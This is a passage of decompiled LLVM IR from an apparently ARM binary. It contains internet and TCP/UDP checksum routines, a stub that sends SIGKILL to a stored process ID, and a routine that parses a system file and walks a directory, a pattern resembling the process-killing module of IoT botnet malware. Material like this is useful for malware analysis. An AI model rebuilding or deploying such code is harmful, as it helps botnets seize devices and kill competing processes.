  uselistorder label %dec_label_pc_efac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ef4c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ef40, { 1, 0 }
  uselistorder label %bb150, { 1, 0 }
  uselistorder label %bb147, { 1, 0 }
  uselistorder label %.thread22, { 1, 0 }
  uselistorder label %dec_label_pc_ebfc, { 1, 0 }
  uselistorder label %dec_label_pc_ebf0, { 1, 0 }
  uselistorder label %dec_label_pc_ebb4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ebac, { 1, 0 }
}

define i32 @function_f17c(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f17c:
  %tmp = or i32 %arg1, 1
  %tmp9 = icmp eq i32 %tmp, 1
  br i1 %tmp9, label %dec_label_pc_f1ac, label %dec_label_pc_f188

dec_label_pc_f188:                                ; preds = %dec_label_pc_f17c
  %v0_f18c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_f18c

dec_label_pc_f18c:                                ; preds = %dec_label_pc_f18c, %dec_label_pc_f188
  %v0_f1a0 = phi i32 [ %v2_f1a0, %dec_label_pc_f18c ], [ 0, %dec_label_pc_f188 ]
  %v0_f194 = phi i32 [ %v1_f194, %dec_label_pc_f18c ], [ %arg1, %dec_label_pc_f188 ]
  %v0_f1a4 = phi i32 [ %v1_f1a4, %dec_label_pc_f18c ], [ %v0_f18c.pre, %dec_label_pc_f188 ]
  %v1_f18c = inttoptr i32 %v0_f1a4 to i8*
  %v2_f18c = load i8, i8* %v1_f18c, align 1
  %v3_f18c = zext i8 %v2_f18c to i32
  %v1_f190 = add i32 %v0_f1a4, 1
  %v2_f190 = inttoptr i32 %v1_f190 to i8*
  %v3_f190 = load i8, i8* %v2_f190, align 1
  %v4_f190 = zext i8 %v3_f190 to i32
  %v1_f194 = add i32 %v0_f194, -2
  %v4_f198 = mul nuw nsw i32 %v4_f190, 256
  %v5_f198 = or i32 %v4_f198, %v3_f18c
  %v2_f1a0 = add i32 %v5_f198, %v0_f1a0
  %v1_f1a4 = add i32 %v0_f1a4, 2
  store i32 %v1_f1a4, i32* @r0, align 4
  %v1_f194.cmp = icmp ugt i32 %v1_f194, 1
  br i1 %v1_f194.cmp, label %dec_label_pc_f18c, label %dec_label_pc_f1ac

dec_label_pc_f1ac:                                ; preds = %dec_label_pc_f18c, %dec_label_pc_f17c
  %v1_f1b4 = phi i32 [ 0, %dec_label_pc_f17c ], [ %v2_f1a0, %dec_label_pc_f18c ]
  %v0_f1ac = phi i32 [ %arg1, %dec_label_pc_f17c ], [ %v1_f194, %dec_label_pc_f18c ]
  %v7_f1ac = icmp eq i32 %v0_f1ac, 1
  br i1 %v7_f1ac, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f1ac
  %v1_f1b0 = load i32, i32* @r0, align 4
  %v2_f1b0 = inttoptr i32 %v1_f1b0 to i8*
  %v3_f1b0 = load i8, i8* %v2_f1b0, align 1
  %v4_f1b0 = zext i8 %v3_f1b0 to i32
  %v3_f1b4 = add i32 %v1_f1b4, %v4_f1b0
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f1ac, %bb
  %v0_f1b8 = phi i32 [ %v1_f1b4, %dec_label_pc_f1ac ], [ %v3_f1b4, %bb ]
  %v3_f1bc = urem i32 %v0_f1b8, 65536
  %v4_f1c0 = udiv i32 %v0_f1b8, 65536
  %v5_f1c0 = add nuw nsw i32 %v4_f1c0, %v3_f1bc
  %v4_f1c4 = udiv i32 %v5_f1c0, 65536
  %v5_f1c4 = add nuw nsw i32 %v4_f1c4, %v5_f1c0
  %v1_f1c8 = urem i32 %v5_f1c4, 65536
  %v3_f1d0 = xor i32 %v1_f1c8, 65535
  ret i32 %v3_f1d0

; uselistorder directives
  uselistorder i32 %v5_f1c0, { 1, 0 }
  uselistorder i32 %v1_f1a4, { 1, 0 }
  uselistorder i32 %v1_f194, { 1, 0, 2 }
  uselistorder i32 %v0_f1a4, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_f1d8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_f1d8:
  %v3_f1e8 = urem i32 %arg2, 65536
  %v1_f1ec = add i32 %arg1, 12
  %v1_f1f0 = inttoptr i32 %v1_f1ec to i32*
  %v2_f1f0 = load i32, i32* %v1_f1f0, align 4
  %v3_f1f0 = add i32 %arg1, 16
  %v4_f1f0 = inttoptr i32 %v3_f1f0 to i32*
  %v5_f1f0 = load i32, i32* %v4_f1f0, align 4
  %v7_f1f4 = icmp sgt i32 %arg3, 1
  br i1 %v7_f1f4, label %dec_label_pc_f200.preheader, label %dec_label_pc_f220

dec_label_pc_f200.preheader:                      ; preds = %dec_label_pc_f1d8
  %v0_f200.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_f200

dec_label_pc_f200:                                ; preds = %dec_label_pc_f200.preheader, %dec_label_pc_f200
  %v0_f214 = phi i32 [ 0, %dec_label_pc_f200.preheader ], [ %v2_f214, %dec_label_pc_f200 ]
  %v0_f208 = phi i32 [ %arg3, %dec_label_pc_f200.preheader ], [ %v1_f208, %dec_label_pc_f200 ]
  %v0_f218 = phi i32 [ %v0_f200.pre, %dec_label_pc_f200.preheader ], [ %v1_f218, %dec_label_pc_f200 ]
  %v1_f200 = inttoptr i32 %v0_f218 to i8*
  %v2_f200 = load i8, i8* %v1_f200, align 1
  %v3_f200 = zext i8 %v2_f200 to i32
  %v1_f204 = add i32 %v0_f218, 1
  %v2_f204 = inttoptr i32 %v1_f204 to i8*
  %v3_f204 = load i8, i8* %v2_f204, align 1
  %v4_f204 = zext i8 %v3_f204 to i32
  %v1_f208 = add nsw i32 %v0_f208, -2
  %v4_f20c = mul nuw nsw i32 %v4_f204, 256
  %v5_f20c = or i32 %v4_f20c, %v3_f200
  %v2_f214 = add i32 %v5_f20c, %v0_f214
  %v1_f218 = add i32 %v0_f218, 2
  store i32 %v1_f218, i32* @r1, align 4
  %v8_f21c = icmp sgt i32 %v1_f208, 1
  br i1 %v8_f21c, label %dec_label_pc_f200, label %dec_label_pc_f220

dec_label_pc_f220:                                ; preds = %dec_label_pc_f200, %dec_label_pc_f1d8
  %v1_f228 = phi i32 [ 0, %dec_label_pc_f1d8 ], [ %v2_f214, %dec_label_pc_f200 ]
  %v0_f220 = phi i32 [ %arg3, %dec_label_pc_f1d8 ], [ %v1_f208, %dec_label_pc_f200 ]
  %v7_f220 = icmp eq i32 %v0_f220, 1
  br i1 %v7_f220, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_f220
  %v1_f224 = load i32, i32* @r1, align 4
  %v2_f224 = inttoptr i32 %v1_f224 to i8*
  %v3_f224 = load i8, i8* %v2_f224, align 1
  %v4_f224 = zext i8 %v3_f224 to i32
  %v3_f228 = add i32 %v4_f224, %v1_f228
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_f220, %bb
  %v0_f24c = phi i32 [ %v1_f228, %dec_label_pc_f220 ], [ %v3_f228, %bb ]
  %v3_f230 = urem i32 %v2_f1f0, 65536
  %v1_f238 = add i32 %arg1, 9
  %v2_f238 = inttoptr i32 %v1_f238 to i8*
  %v3_f238 = load i8, i8* %v2_f238, align 1
  %v4_f238 = zext i8 %v3_f238 to i32
  %v3_f23c = urem i32 %v5_f1f0, 65536
  %v4_f240 = udiv i32 %v2_f1f0, 65536
  %v3_f248 = mul nuw nsw i32 %v4_f238, 256
  %v4_f24c = udiv i32 %v5_f1f0, 65536
  %v5_f24c = add i32 %v0_f24c, %v4_f24c
  %v2_f250 = add i32 %v5_f24c, %v3_f248
  %v5_f240 = add nuw nsw i32 %v3_f230, %v3_f1e8
  %v2_f244 = add nuw nsw i32 %v5_f240, %v4_f240
  %v2_f254 = add nuw nsw i32 %v2_f244, %v3_f23c
  %v2_f258 = add i32 %v2_f250, %v2_f254
  %tmp = icmp ult i32 %v2_f258, 65536
  br i1 %tmp, label %dec_label_pc_f278, label %dec_label_pc_f264

dec_label_pc_f264:                                ; preds = %.thread, %dec_label_pc_f264
  %v2_f26c1 = phi i32 [ %v2_f26c, %dec_label_pc_f264 ], [ %v2_f258, %.thread ]
  %v3_f2702.in = phi i32 [ %v2_f26c, %dec_label_pc_f264 ], [ %v2_f258, %.thread ]
  %v3_f2702 = udiv i32 %v3_f2702.in, 65536
  %v3_f268 = urem i32 %v2_f26c1, 65536
  %v2_f26c = add nuw nsw i32 %v3_f268, %v3_f2702
  %tmp14 = icmp ult i32 %v2_f26c, 65536
  br i1 %tmp14, label %dec_label_pc_f278.loopexit, label %dec_label_pc_f264

dec_label_pc_f278.loopexit:                       ; preds = %dec_label_pc_f264
  br label %dec_label_pc_f278

dec_label_pc_f278:                                ; preds = %dec_label_pc_f278.loopexit, %.thread
  %v0_f278 = phi i32 [ %v2_f26c, %dec_label_pc_f278.loopexit ], [ %v2_f258, %.thread ]
  %v1_f278 = urem i32 %v0_f278, 65536
  %v3_f280 = xor i32 %v1_f278, 65535
  ret i32 %v3_f280

; uselistorder directives
  uselistorder i32 %v2_f26c, { 2, 1, 3, 0 }
  uselistorder i32 %v2_f258, { 3, 0, 2, 1 }
  uselistorder i32 %v1_f228, { 1, 0 }
  uselistorder i32 %v1_f218, { 1, 0 }
  uselistorder i32 %v1_f208, { 0, 2, 1 }
  uselistorder i32 %v0_f218, { 0, 2, 1 }
  uselistorder i32 %arg3, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_f264, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_f200, { 1, 0 }
}

define i32 @function_f288(i32 %arg1) local_unnamed_addr {
dec_label_pc_f288:
  %v2_f28c = load i32, i32* @global_var_1cd50.151, align 4
  %v2_f294 = call i32 @kill(i32 %v2_f28c, i32 9)
  %v0_f298 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f298, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_f288
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_f288, %bb
  ret i32 %v2_f294

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_f29c(i32 %arg1) local_unnamed_addr {
dec_label_pc_f29c:
  %r4.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-68 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-581 = alloca i8, align 1
  %stack_var_-8773 = alloca i32, align 4
  %stack_var_-4677 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_f29c = load i32, i32* @r4, align 4
  store i32 %v3_f29c, i32* %stack_var_-36, align 4
  %v6_f29c = load i32, i32* @r5, align 4
  %v9_f29c = load i32, i32* @r6, align 4
  %v12_f29c = load i32, i32* @r7, align 4
  %v15_f29c = load i32, i32* @r8, align 4
  %v21_f29c = load i32, i32* @sl, align 4
  %v2_f2b0 = ptrtoint i32* %stack_var_-4677 to i32
  store i32 %v2_f2b0, i32* @sl, align 4
  %v3_f2b8 = mul i32 %arg1, 65536
  store i32 %v3_f2b8, i32* @r5, align 4
  %v2_f2c4 = ptrtoint i32* %stack_var_-8773 to i32
  %v4_f2d0 = call i32* @memset(i32* nonnull %stack_var_-4677, i32 0, i32 4096)
  %v0_f2e4 = load i32, i32* @r5, align 4
  %v3_f2e4 = udiv i32 %v0_f2e4, 65536
  store i32 %v3_f2e4, i32* %r4.global-to-local, align 4
  %v4_f2e8 = call i32* @memset(i32* nonnull %stack_var_-8773, i32 0, i32 4096)
  %v2_f2ec = ptrtoint i8* %stack_var_-581 to i32
  store i32 %v2_f2ec, i32* @r6, align 4
  %v1_f2f4 = mul nuw nsw i32 %v3_f2e4, 256
  %v3_f300 = and i32 %v1_f2f4, 65280
  store i32 %v3_f300, i32* %r4.global-to-local, align 4
  %v2_f308 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_f308, i32* %sb.global-to-local, align 4
  %v3_f30c = bitcast i8* %stack_var_-581 to i32*
  %v4_f30c = call i32* @memset(i32* %v3_f30c, i32 0, i32 513)
  %v2_f310 = ptrtoint i8* %stack_var_-68 to i32
  store i32 %v2_f310, i32* %sb.global-to-local, align 4
  %v0_f318 = load i32, i32* %r4.global-to-local, align 4
  %v1_f318 = load i32, i32* @r5, align 4
  %v4_f318 = udiv i32 %v1_f318, 16777216
  %v5_f318 = or i32 %v4_f318, %v0_f318
  store i32 0, i32* @r4, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v3_f338 = trunc i32 %v5_f318 to i8
  %v4_f338 = call i32 @function_13e90(i8 %v3_f338, i32 16, i32 %v2_f310)
  %v2_f340 = call i32 @function_1399c(i8* nonnull %stack_var_-68)
  %v7_f344 = icmp eq i32 %v2_f340, 2
  br i1 %v7_f344, label %dec_label_pc_f7d8, label %dec_label_pc_f34c

dec_label_pc_f34c:                                ; preds = %dec_label_pc_f29c, %dec_label_pc_f7d8
  %v1_f350 = call i32 @function_13074(i32 6)
  %v1_f358 = call i32 @function_13074(i32 7)
  %v1_f360 = call i32 @function_13074(i32 9)
  %v0_f368 = load i32, i32* @r4, align 4
  %v4_f36c = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @global_var_14340.153, i32 0, i32 0), i32 %v0_f368)
  %v7_f370 = icmp eq i32 %v4_f36c, -1
  store i32 %v4_f36c, i32* @r8, align 4
  br i1 %v7_f370, label %dec_label_pc_f798, label %dec_label_pc_f37c.preheader

dec_label_pc_f37c.preheader:                      ; preds = %dec_label_pc_f34c
  %v4_f38854 = call i32 @function_13bf4(i32* %v3_f30c, i32 512, i32 %v4_f36c)
  %v2_f38c56 = icmp eq i32 %v4_f38854, 0
  br i1 %v2_f38c56, label %dec_label_pc_f51c.loopexit, label %dec_label_pc_f394.lr.ph

dec_label_pc_f394.lr.ph:                          ; preds = %dec_label_pc_f37c.preheader
  %v2_f3dc = ptrtoint i32* %stack_var_-36 to i32
  br label %dec_label_pc_f394

dec_label_pc_f394:                                ; preds = %dec_label_pc_f394.lr.ph, %dec_label_pc_f37c.backedge
  %v3_f398 = load i8, i8* %stack_var_-581, align 1
  %v4_f398 = sext i8 %v3_f398 to i32
  %v2_f39c = icmp eq i8 %v3_f398, 0
  br i1 %v2_f39c, label %bb125, label %bb

bb:                                               ; preds = %dec_label_pc_f394
  %v8_f3a0 = icmp eq i8 %v3_f398, 58
  br i1 %v8_f3a0, label %.thread6, label %dec_label_pc_f3b4

.thread6:                                         ; preds = %bb
  br label %dec_label_pc_f3cc

bb125:                                            ; preds = %dec_label_pc_f394
  br label %dec_label_pc_f3cc

dec_label_pc_f3b4:                                ; preds = %bb
  %v1_f3bc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_f3b8

dec_label_pc_f3b8:                                ; preds = %bb126, %dec_label_pc_f3b4
  %v0_f3b8 = phi i32 [ %v1_f3b8, %bb126 ], [ 0, %dec_label_pc_f3b4 ]
  %v1_f3b8 = add i32 %v0_f3b8, 1
  %v2_f3bc = add i32 %v1_f3b8, %v1_f3bc.pre
  %v3_f3bc = inttoptr i32 %v2_f3bc to i8*
  %v4_f3bc = load i8, i8* %v3_f3bc, align 1
  %v6_f3bc = zext i8 %v4_f3bc to i32
  %v2_f3c0 = icmp eq i8 %v4_f3bc, 0
  br i1 %v2_f3c0, label %dec_label_pc_f3cc, label %bb126

bb126:                                            ; preds = %dec_label_pc_f3b8
  %v8_f3c4 = icmp eq i8 %v4_f3bc, 58
  br i1 %v8_f3c4, label %dec_label_pc_f3cc, label %dec_label_pc_f3b8

dec_label_pc_f3cc:                                ; preds = %dec_label_pc_f3b8, %bb126, %bb125, %.thread6
  %v1_f3f8 = phi i32 [ 0, %.thread6 ], [ 0, %bb125 ], [ %v1_f3b8, %bb126 ], [ %v1_f3b8, %dec_label_pc_f3b8 ]
  %v0_f3cc = phi i32 [ %v4_f398, %.thread6 ], [ %v4_f398, %bb125 ], [ %v6_f3bc, %bb126 ], [ %v6_f3bc, %dec_label_pc_f3b8 ]
  %v2_f3cc = icmp eq i32 %v0_f3cc, 0
  br i1 %v2_f3cc, label %dec_label_pc_f37c.backedge, label %dec_label_pc_f3d4

dec_label_pc_f37c.backedge:                       ; preds = %dec_label_pc_f3cc, %dec_label_pc_f4a4, %dec_label_pc_f4f0, %dec_label_pc_f418
  %v0_f384 = load i32, i32* @r8, align 4
  %v4_f388 = call i32 @function_13bf4(i32* %v3_f30c, i32 512, i32 %v0_f384)
  %v2_f38c = icmp eq i32 %v4_f388, 0
  br i1 %v2_f38c, label %dec_label_pc_f51c.loopexit, label %dec_label_pc_f394

dec_label_pc_f3d4:                                ; preds = %dec_label_pc_f3cc
  %v1_f3d8 = add i32 %v1_f3f8, 2
  %v2_f3e0 = add i32 %v1_f3d8, %v2_f3dc
  %v1_f3e4 = add i32 %v2_f3e0, -545
  %v2_f3e4 = inttoptr i32 %v1_f3e4 to i8*
  %v3_f3e4 = load i8, i8* %v2_f3e4, align 1
  %v2_f3e8 = icmp eq i8 %v3_f3e4, 0
  br i1 %v2_f3e8, label %bb128, label %bb127

bb127:                                            ; preds = %dec_label_pc_f3d4
  %v8_f3ec = icmp eq i8 %v3_f3e4, 32
  br i1 %v8_f3ec, label %.thread10, label %dec_label_pc_f3f8

.thread10:                                        ; preds = %bb127
  store i32 %v1_f3d8, i32* @r5, align 4
  br label %dec_label_pc_f418

bb128:                                            ; preds = %dec_label_pc_f3d4
  store i32 %v1_f3d8, i32* @r5, align 4
  br label %dec_label_pc_f418

dec_label_pc_f3f8:                                ; preds = %bb127
  %v0_f3f8 = load i32, i32* @r6, align 4
  %v2_f3f8 = add i32 %v0_f3f8, %v1_f3f8
  br label %dec_label_pc_f3fc

dec_label_pc_f3fc:                                ; preds = %bb129, %dec_label_pc_f3f8
  %v0_f40813 = phi i32 [ %v1_f408, %bb129 ], [ %v2_f3f8, %dec_label_pc_f3f8 ]
  %v1_f3fc = add i32 %v0_f40813, 3
  %v2_f3fc = inttoptr i32 %v1_f3fc to i8*
  %v3_f3fc = load i8, i8* %v2_f3fc, align 1
  %v2_f400 = icmp eq i8 %v3_f3fc, 0
  br i1 %v2_f400, label %.thread12, label %bb129

.thread12:                                        ; preds = %dec_label_pc_f3fc
  %v1_f40814 = add i32 %v0_f40813, 1
  br label %dec_label_pc_f410

bb129:                                            ; preds = %dec_label_pc_f3fc
  %v8_f404 = icmp eq i8 %v3_f3fc, 32
  %v1_f408 = add i32 %v0_f40813, 1
  br i1 %v8_f404, label %dec_label_pc_f410, label %dec_label_pc_f3fc

dec_label_pc_f410:                                ; preds = %bb129, %.thread12
  %v1_f40815 = phi i32 [ %v1_f40814, %.thread12 ], [ %v1_f408, %bb129 ]
  %v2_f410 = sub i32 %v1_f40815, %v0_f3f8
  %v1_f414 = add i32 %v2_f410, 2
  store i32 %v1_f414, i32* @r5, align 4
  br label %dec_label_pc_f418

dec_label_pc_f418:                                ; preds = %bb128, %.thread10, %dec_label_pc_f410
  %v1_f424 = phi i32 [ %v1_f3d8, %.thread10 ], [ %v1_f3d8, %bb128 ], [ %v1_f414, %dec_label_pc_f410 ]
  %v0_f418 = load i32, i32* @r6, align 4
  %v2_f418 = add i32 %v0_f418, %v1_f3d8
  store i32 %v2_f418, i32* @r4, align 4
  %v2_f424 = add i32 %v1_f424, %v2_f3dc
  store i32 0, i32* @r7, align 4
  %v3_f430 = add i32 %v2_f424, -545
  %v4_f430 = inttoptr i32 %v3_f430 to i8*
  store i8 0, i8* %v4_f430, align 1
  %v1_f434 = inttoptr i32 %v2_f418 to i8*
  %v2_f434 = call i32 @function_1399c(i8* %v1_f434)
  store i32 %v2_f434, i32* @r1, align 4
  %v0_f440 = load i32, i32* @r4, align 4
  %v3_f444 = inttoptr i32 %v0_f440 to i8*
  %v4_f444 = call i32 @function_13cf0(i8* %v3_f444, i32 %v2_f434, i32 %v2_f310)
  %v7_f448 = icmp eq i32 %v4_f444, -1
  br i1 %v7_f448, label %dec_label_pc_f37c.backedge, label %dec_label_pc_f464.preheader

dec_label_pc_f464.preheader:                      ; preds = %dec_label_pc_f418
  %v1_f44c = load i32, i32* @r7, align 4
  %v1_f450 = load i32, i32* @r6, align 4
  %v2_f450 = load i32, i32* @r5, align 4
  %v3_f450 = add i32 %v2_f450, %v1_f450
  store i32 %v1_f44c, i32* @r4, align 4
  %v1_f46446 = add i32 %v3_f450, 2
  %v2_f46447 = inttoptr i32 %v1_f46446 to i8*
  %v3_f46448 = load i8, i8* %v2_f46447, align 1
  %v2_f46850 = icmp eq i8 %v3_f46448, 0
  %v1_f46c52 = add i32 %v2_f450, 2
  br i1 %v2_f46850, label %dec_label_pc_f4a4, label %dec_label_pc_f474

dec_label_pc_f474:                                ; preds = %dec_label_pc_f464.preheader, %dec_label_pc_f464.backedge
  %v0_f4a482 = phi i32 [ %v0_f4a481, %dec_label_pc_f464.backedge ], [ %v1_f44c, %dec_label_pc_f464.preheader ]
  %v0_f48c.pr = phi i32 [ %v0_f48c.pr67, %dec_label_pc_f464.backedge ], [ %v1_f44c, %dec_label_pc_f464.preheader ]
  %v0_f7a8 = phi i32 [ %v0_f7a870, %dec_label_pc_f464.backedge ], [ %v1_f44c, %dec_label_pc_f464.preheader ]
  %v0_f46c78 = phi i32 [ %v1_f46c, %dec_label_pc_f464.backedge ], [ %v1_f46c52, %dec_label_pc_f464.preheader ]
  %v0_f49c = phi i32 [ %v0_f464, %dec_label_pc_f464.backedge ], [ %v3_f450, %dec_label_pc_f464.preheader ]
  %v1_f478.in = phi i8 [ %v3_f464, %dec_label_pc_f464.backedge ], [ %v3_f46448, %dec_label_pc_f464.preheader ]
  %v7_f474 = icmp eq i8 %v1_f478.in, 9
  br i1 %v7_f474, label %.thread23, label %bb130

bb130:                                            ; preds = %dec_label_pc_f474
  %v8_f478 = icmp eq i8 %v1_f478.in, 32
  br i1 %v8_f478, label %.thread23.thread35, label %dec_label_pc_f48c

.thread23.thread35:                               ; preds = %bb130
  br label %dec_label_pc_f498

.thread23:                                        ; preds = %dec_label_pc_f474
  br label %dec_label_pc_f498

dec_label_pc_f48c:                                ; preds = %bb130
  %v7_f48c = icmp eq i32 %v0_f48c.pr, 1
  br i1 %v7_f48c, label %dec_label_pc_f7a8, label %dec_label_pc_f494

dec_label_pc_f494:                                ; preds = %dec_label_pc_f7a8, %dec_label_pc_f48c
  %v0_f49875 = phi i32 [ %v1_f7a8, %dec_label_pc_f7a8 ], [ %v0_f7a8, %dec_label_pc_f48c ]
  br label %dec_label_pc_f498

dec_label_pc_f498:                                ; preds = %.thread23, %.thread23.thread35, %dec_label_pc_f494
  %v0_f498 = phi i32 [ %v0_f7a8, %.thread23.thread35 ], [ %v0_f7a8, %.thread23 ], [ %v0_f49875, %dec_label_pc_f494 ]
  %v0_f48c.pr68 = phi i32 [ 1, %.thread23.thread35 ], [ 1, %.thread23 ], [ 0, %dec_label_pc_f494 ]
  %v7_f4a0 = icmp sgt i32 %v0_f498, 6
  br i1 %v7_f4a0, label %dec_label_pc_f4a4, label %dec_label_pc_f464.backedge

dec_label_pc_f4a4:                                ; preds = %dec_label_pc_f464.backedge, %dec_label_pc_f498, %dec_label_pc_f464.preheader
  %v1_f4f4 = phi i32 [ %v1_f46c52, %dec_label_pc_f464.preheader ], [ %v1_f46c, %dec_label_pc_f464.backedge ], [ %v0_f46c78, %dec_label_pc_f498 ]
  %v0_f4a4 = phi i32 [ %v1_f44c, %dec_label_pc_f464.preheader ], [ %v0_f4a481, %dec_label_pc_f464.backedge ], [ %v0_f4a482, %dec_label_pc_f498 ]
  %v2_f4a4 = icmp eq i32 %v0_f4a4, 0
  br i1 %v2_f4a4, label %dec_label_pc_f37c.backedge, label %dec_label_pc_f4b0

dec_label_pc_f4b0:                                ; preds = %dec_label_pc_f4a4
  %v2_f4b8 = add i32 %v1_f4f4, %v2_f3dc
  %v1_f4bc = add i32 %v2_f4b8, -545
  %v2_f4bc = inttoptr i32 %v1_f4bc to i8*
  %v3_f4bc = load i8, i8* %v2_f4bc, align 1
  %v2_f4c0 = icmp eq i8 %v3_f4bc, 0
  br i1 %v2_f4c0, label %dec_label_pc_f4f0, label %bb131

bb131:                                            ; preds = %dec_label_pc_f4b0
  %v8_f4c4 = icmp eq i8 %v3_f4bc, 32
  br i1 %v8_f4c4, label %dec_label_pc_f4f0, label %dec_label_pc_f4cc

dec_label_pc_f4cc:                                ; preds = %bb131
  %v2_f4cc = add i32 %v1_f4f4, %v1_f450
  br label %dec_label_pc_f4d0

dec_label_pc_f4d0:                                ; preds = %bb132, %dec_label_pc_f4cc
  %v0_f4dc28 = phi i32 [ %v1_f4dc, %bb132 ], [ %v1_f4f4, %dec_label_pc_f4cc ]
  %v0_f4d0 = phi i32 [ %v1_f4d0, %bb132 ], [ %v2_f4cc, %dec_label_pc_f4cc ]
  %v1_f4d0 = add i32 %v0_f4d0, 1
  %v2_f4d0 = inttoptr i32 %v1_f4d0 to i8*
  %v3_f4d0 = load i8, i8* %v2_f4d0, align 1
  %v2_f4d4 = icmp eq i8 %v3_f4d0, 0
  br i1 %v2_f4d4, label %.thread27, label %bb132

.thread27:                                        ; preds = %dec_label_pc_f4d0
  %v1_f4dc29 = add i32 %v0_f4dc28, 1
  br label %dec_label_pc_f4e4

bb132:                                            ; preds = %dec_label_pc_f4d0
  %v8_f4d8 = icmp eq i8 %v3_f4d0, 32
  %v1_f4dc = add i32 %v0_f4dc28, 1
  br i1 %v8_f4d8, label %dec_label_pc_f4e4, label %dec_label_pc_f4d0

dec_label_pc_f4e4:                                ; preds = %bb132, %.thread27
  %v1_f4ec = phi i32 [ %v1_f4dc29, %.thread27 ], [ %v1_f4dc, %bb132 ]
  %v2_f4ec = add i32 %v1_f4ec, %v2_f3dc
  br label %dec_label_pc_f4f0

dec_label_pc_f4f0:                                ; preds = %dec_label_pc_f4b0, %bb131, %dec_label_pc_f4e4
  %v2_f4fc = phi i32 [ %v2_f4b8, %dec_label_pc_f4b0 ], [ %v2_f4b8, %bb131 ], [ %v2_f4ec, %dec_label_pc_f4e4 ]
  %v2_f4f4 = add i32 %v1_f4f4, %v1_f450
  store i32 %v2_f4f4, i32* @r4, align 4
  %v3_f4fc = add i32 %v2_f4fc, -545
  %v4_f4fc = inttoptr i32 %v3_f4fc to i8*
  store i8 0, i8* %v4_f4fc, align 1
  %v1_f500 = inttoptr i32 %v2_f4f4 to i8*
  %v2_f500 = call i32 @function_1399c(i8* %v1_f500)
  %v8_f508 = icmp sgt i32 %v2_f500, 15
  br i1 %v8_f508, label %dec_label_pc_f37c.backedge, label %dec_label_pc_f50c

dec_label_pc_f50c:                                ; preds = %dec_label_pc_f4f0
  %v0_f510 = load i32, i32* @r4, align 4
  %v2_f514 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_f514, i32* @r0, align 4
  %v2_f518 = bitcast i32* %stack_var_-52 to i8*
  %v3_f518 = call i32 @function_139c4(i8* %v2_f518, i32 %v0_f510)
  br label %dec_label_pc_f51c

dec_label_pc_f51c.loopexit:                       ; preds = %dec_label_pc_f37c.backedge, %dec_label_pc_f37c.preheader
  %.pre = ptrtoint i32* %stack_var_-52 to i32
  %.pre94 = bitcast i32* %stack_var_-52 to i8*
  br label %dec_label_pc_f51c

dec_label_pc_f51c:                                ; preds = %dec_label_pc_f51c.loopexit, %dec_label_pc_f50c
  %v1_f52c.pre-phi = phi i8* [ %.pre94, %dec_label_pc_f51c.loopexit ], [ %v2_f518, %dec_label_pc_f50c ]
  %v2_f528.pre-phi = phi i32 [ %.pre, %dec_label_pc_f51c.loopexit ], [ %v2_f514, %dec_label_pc_f50c ]
  %v0_f51c = load i32, i32* @r8, align 4
  %v1_f520 = call i32 @close(i32 %v0_f51c)
  %v2_f52c = call i32 @function_1399c(i8* %v1_f52c.pre-phi)
  store i32 %v2_f52c, i32* @r4, align 4
  %v2_f530 = icmp eq i32 %v2_f52c, 0
  br i1 %v2_f530, label %dec_label_pc_f780, label %dec_label_pc_f538

dec_label_pc_f538:                                ; preds = %dec_label_pc_f51c
  %v3_f540 = call i32 @function_12f90(i32 6, i32* null)
  %v4_f540 = inttoptr i32 %v3_f540 to i8*
  %v3_f544 = call %__dirstream* @opendir(i8* %v4_f540)
  %v5_f544 = ptrtoint %__dirstream* %v3_f544 to i32
  store i32 %v5_f544, i32* @r8, align 4
  %v2_f548 = icmp eq %__dirstream* %v3_f544, null
  br i1 %v2_f548, label %dec_label_pc_f778, label %dec_label_pc_f558.preheader

dec_label_pc_f558.preheader:                      ; preds = %dec_label_pc_f538
  store i32 0, i32* @r5, align 4
  %v3_f55c41 = call %dirent* @readdir(%__dirstream* nonnull %v3_f544)
  %v2_f56044 = icmp eq %dirent* %v3_f55c41, null
  br i1 %v2_f56044, label %dec_label_pc_f76c, label %dec_label_pc_f568.preheader.lr.ph

dec_label_pc_f568.preheader.lr.ph:                ; preds = %dec_label_pc_f558.preheader
  %v2_f598 = bitcast i32* %stack_var_-4677 to i8*
  %tmp134 = bitcast i32* %stack_var_-8773 to i8*
  br label %dec_label_pc_f568.preheader

dec_label_pc_f558.loopexit:                       ; preds = %dec_label_pc_f570, %dec_label_pc_f584, %dec_label_pc_f5ec
  %v0_f558 = load i32, i32* @r8, align 4
  %v1_f558 = inttoptr i32 %v0_f558 to %__dirstream*
  %v3_f55c = call %dirent* @readdir(%__dirstream* %v1_f558)
  %v2_f560 = icmp eq %dirent* %v3_f55c, null
  br i1 %v2_f560, label %dec_label_pc_f76c, label %dec_label_pc_f568.preheader

